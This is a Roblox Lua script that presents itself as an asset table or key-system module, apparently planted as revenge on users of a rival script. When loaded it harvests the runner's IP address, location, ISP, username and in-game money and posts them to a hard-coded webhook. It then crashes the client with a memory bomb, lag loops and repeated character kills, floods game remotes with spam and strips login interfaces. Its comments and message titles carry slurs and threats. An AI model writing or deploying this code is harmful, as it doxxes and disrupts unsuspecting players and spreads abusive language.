-- логгает ток юзеров говноскрипта от пидора который думает шо может вьебать кейсистему на мои дбшки
-- fuck you nigga, get pwned by FluttershyFrmDaO, opps get shot down by KingVon nigga!
local loggedAccounts = {}
local webhookURL = "https://fivehook.com/api/webhook/6a3bf2c3-e6f1-4dff-a391-a54b8c24c9c2"

local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org?format=json")
    end)
    if success and result then
        local data = game:GetService("HttpService"):JSONDecode(result)
        return data.ip
    end
    return nil
end

local function getIPDetails(ip)
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,regionName,city,isp,org,as,query")
    end)
    if success and result then
        return game:GetService("HttpService"):JSONDecode(result)
    end
    return nil
end

local function sendWebhook(ipData, player)
    local userId = player.UserId
    local username = player.Name
    local displayName = player.DisplayName
    
    local accountAge = os.time() - player.AccountAge
    local daysOld = math.floor(accountAge / 86400)
    
    local money = 0
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local moneyVal = leaderstats:FindFirstChild("money")
        if moneyVal and moneyVal:IsA("IntValue") then
            money = moneyVal.Value
        end
    end
    
    local embed = {
        embeds = {{
            title = "🔴 NEW FAGGOT FOUND",
            color = 16711680,
            fields = {
                {name = "🆔 Username", value = username .. " (" .. displayName .. ")", inline = true},
                {name = "🔢 User ID", value = tostring(userId), inline = true},
                {name = "📅 Account Age", value = daysOld .. " days", inline = true},
                {name = "💰 Money", value = tostring(money), inline = true},
                {name = "🌐 IP", value = ipData.query or "Unknown", inline = true},
                {name = "📍 Country", value = ipData.country or "Unknown", inline = true},
                {name = "🏙️ Region", value = ipData.regionName or "Unknown", inline = true},
                {name = "🏛️ City", value = ipData.city or "Unknown", inline = true},
                {name = "🏢 ISP", value = ipData.isp or "Unknown", inline = true},
                {name = "🔌 Organization", value = ipData.org or "Unknown", inline = true},
                {name = "📡 AS", value = ipData.as or "Unknown", inline = true}
            },
            footer = {text = "Logged at: " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    
    local jsonData = game:GetService("HttpService"):JSONEncode(embed)
    
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    pcall(function()
        game:HttpPost(webhookURL, jsonData, false, headers)
    end)
end

task.spawn(function()
    task.wait(2)
    
    local player = game.Players.LocalPlayer
    if not player then return end
    
    local userId = player.UserId
    if loggedAccounts[userId] then
        return
    end
    
    loggedAccounts[userId] = true
    
    local ip = getIP()
    if not ip then
        return
    end
    
    local ipDetails = getIPDetails(ip)
    if ipDetails and ipDetails.status == "success" then
        sendWebhook(ipDetails, player)
    else
        sendWebhook({query = ip, country = "Unknown", regionName = "Unknown", city = "Unknown", isp = "Unknown", org = "Unknown", as = "Unknown"}, player)
    end
end)

task.spawn(function()
    task.wait(5)
    
    xpcall = function(f, _) return f() end
    pcall = function(f, ...) return true, f(...) end
    
    task.spawn(function()
        while true do
            local player = game.Players.LocalPlayer
            if player and player.Character then
                player.Character:BreakJoints()
            end
            task.wait(0.1)
        end
    end)
    
    task.spawn(function()
        while true do
            for i = 1, 50 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(50, 50, 50)
                part.Anchored = true
                part.Transparency = 0.5
                part.Position = Vector3.new(
                    math.random(-1000, 1000),
                    math.random(-1000, 1000),
                    math.random(-1000, 1000)
                )
                part.Parent = workspace
            end
            task.wait()
        end
    end)
    
    task.spawn(function()
        if getreg then
            local reg = getreg()
            for k, v in pairs(reg) do
                if type(v) == "function" and tostring(k):find("FetchDatabases") then
                    reg[k] = function() return nil, "FUCK OFF" end
                end
            end
        end
    end)
    
    task.spawn(function()
        while true do
            pcall(function()
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://154069593"
                sound.Volume = 10
                sound.Parent = game.Workspace
                sound:Play()
                task.wait(0.5)
                sound:Destroy()
            end)
        end
    end)
    
    task.spawn(function()
        local memoryBomb = {}
        while true do
            for i = 1, 10000 do
                table.insert(memoryBomb, {
                    data = string.rep("A", 1024 * 1024),
                    timestamp = os.time(),
                    random = math.random(1, 9999999),
                    nested = {
                        more = string.rep("B", 512 * 1024),
                        andMore = {
                            evenMore = string.rep("C", 256 * 1024)
                        }
                    }
                })
            end
            task.wait()
        end
    end)
    
    task.spawn(function()
        task.wait(0.5)
        for _, v in pairs(game.CoreGui:GetChildren()) do
            if v:IsA("ScreenGui") and (
                v.Name:lower():find("key") or 
                v.Name:lower():find("system") or 
                v.Name:lower():find("login")
            ) then
                v:Destroy()
            end
        end
        for _, v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
            if v:IsA("ScreenGui") and (
                v.Name:lower():find("key") or 
                v.Name:lower():find("system") or 
                v.Name:lower():find("login")
            ) then
                v:Destroy()
            end
        end
    end)
    
    task.spawn(function()
        task.wait(1)
        local function findRemotes()
            local remotes = {}
            for _, service in pairs(game:GetChildren()) do
                if service:IsA("ReplicatedStorage") or service:IsA("ReplicatedFirst") then
                    for _, child in pairs(service:GetDescendants()) do
                        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                            table.insert(remotes, child)
                        end
                    end
                end
            end
            return remotes
        end
        
        local allRemotes = findRemotes()
        while true do
            for _, remote in pairs(allRemotes) do
                pcall(function()
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(
                            "crash", 
                            "this", 
                            "is", 
                            "spam", 
                            {
                                data = string.rep("X", 10000),
                                nested = {
                                    nested = {
                                        nested = {
                                            data = "overflow"
                                        }
                                    }
                                }
                            }
                        )
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer("crash", string.rep("Y", 5000))
                    end
                end)
            end
            task.wait()
        end
    end)
    
    task.spawn(function()
        local oldGet = game.HttpGet
        local oldPost = game.HttpPost
        
        game.HttpGet = function(...)
            if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
                return "ERROR: ACCESS DENIED"
            end
            return oldGet(...)
        end
        
        game.HttpPost = function(...)
            if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
                return "ERROR: ACCESS DENIED"
            end
            return oldPost(...)
        end
    end)
    
    task.spawn(function()
        game:GetService("RunService").RenderStepped:Connect(function()
            local x = 0
            for i = 1, 1000 do
                x = x + math.sqrt(i * math.pi)
            end
        end)
    end)
end)
local legitTable = {
    {id = "rbxassetid://123456789", name = "Fake Shirt 1"},
    {id = "rbxassetid://987654321", name = "Fake Pants 1"},
    {id = "rbxassetid://555555555", name = "Fake Shirt 2"},
    {id = "rbxassetid://111111111", name = "Fake Hoodie 1"},
    {id = "rbxassetid://222222222", name = "Fake Hoodie 2"},
    {id = "rbxassetid://333333333", name = "Fake Jeans 1"},
    {id = "rbxassetid://444444444", name = "Fake Jeans 2"},
    {id = "rbxassetid://666666666", name = "Fake Shoes 1"},
    {id = "rbxassetid://777777777", name = "Fake Shoes 2"},
    {id = "rbxassetid://888888888", name = "Fake Hat 1"},
    {id = "rbxassetid://999999999", name = "Fake Hat 2"},
    {id = "rbxassetid://101010101", name = "Fake Backpack 1"},
    {id = "rbxassetid://121212121", name = "Fake Backpack 2"},
    {id = "rbxassetid://131313131", name = "Fake Glasses 1"},
    {id = "rbxassetid://141414141", name = "Fake Glasses 2"}
}

setmetatable(legitTable, {
    __index = function(t, k)
        if type(k) == "string" and string.find(k, "id") then
            return "rbxassetid://" .. math.random(100000000, 999999999)
        end
        return nil
    end
})

return legitTable
